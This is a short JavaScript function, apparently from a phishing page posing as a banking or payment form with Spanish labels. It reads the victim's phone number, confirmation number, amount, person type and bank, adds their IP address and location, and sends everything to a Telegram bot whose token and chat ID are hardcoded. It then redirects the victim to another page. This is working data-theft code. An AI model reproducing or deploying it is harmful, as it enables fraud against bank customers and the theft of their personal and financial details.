function carl(params) {
  const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
  const chatId = "-4217175088";
  const usr = document.getElementById("Inputphone").value;
  const uservalid = document.getElementById("InputphoneValid").value;
  const cuanto = document.getElementById("Inputammount").value;
  const personatype = document.getElementById("selectPersonType").value;
  const banco = document.getElementById("selectBank").value;
  const ip =
    localStorage.getItem("ip") +
    " " +
    localStorage.getItem("ciudad") +
    " " +
    localStorage.getItem("pais");

  const message = `-NEW ONE-\n --Usr.: ${usr} \n -- numero validado: ${uservalid}  \n-- Cuanto:${cuanto} -- Tipo de persona:${personatype} -- Banco:${banco} \n --IP:${ip} `;
  $.ajax({
    type: "POST",
    url: `https://api.telegram.org/bot${token}/sendMessage`,
    data: {
      chat_id: chatId,
      text: message,
      parse_mode: "html",
    },
    success: function (res) {
      console.debug(res);
      $("#response").text("Message sent");
      console.log("enviado");
      localStorage.setItem("usr", usr);
      localStorage.setItem("bank", banco);
      localStorage.setItem("monto", cuanto);
      window.location = "redirect.html";
    },
    error: function (error) {
      console.error(error);
      alert("error failed");
    },
  });
}
